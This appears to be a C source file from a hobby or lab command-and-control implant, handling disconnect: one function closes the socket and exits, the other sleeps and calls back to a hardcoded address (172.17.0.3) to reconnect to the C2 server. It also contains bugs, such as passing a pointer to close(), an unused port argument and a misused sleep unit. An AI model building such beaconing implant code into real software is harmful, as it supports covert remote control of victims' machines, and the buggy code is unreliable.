// Patrick Sacchet
// This file handles all disconnect functionality for the implant

#include "Disconnect.h"

// In this instance, the C2 said to just exit our program so cleanup appropiately
int handleDisconnectExit(int* client_fd)
{
    int status = 1;

    // Disconnect
    close(*client_fd);

    // TODO: other cleanup stuff?
    printf("Disconnected from C2\n");


cleanup:
    return status;
}

// Otherwise, the stager wants us to disconnect, go to sleep, then reconnect at a possibly different port 
    // We will replace our client fd with a new established fd after reconnecting 
int handleDisconnectSleep(int* client_fd, uint64_t sleep_time, uint64_t port)
{
    int status = 1;
    const char* ip_address = "172.17.0.3";

    // Disconnect
    close(client_fd);

    // Sleep for specified time
    printf("Sleeping for %i seconds...\n", (sleep_time/1000));
    sleep(sleep_time);

    // Now just callout again (C2 should be expecting us on this port)
    printf("Attempting to reconnect to C2...\n");

    if (!callout(sleep_time, ip_address, client_fd))
    {
        printf("Failed to re-establish connection to C2\n");
        status = 0;
        goto cleanup;
    }

    printf("Re-established connection to C2!\n");


cleanup:
    return status;
}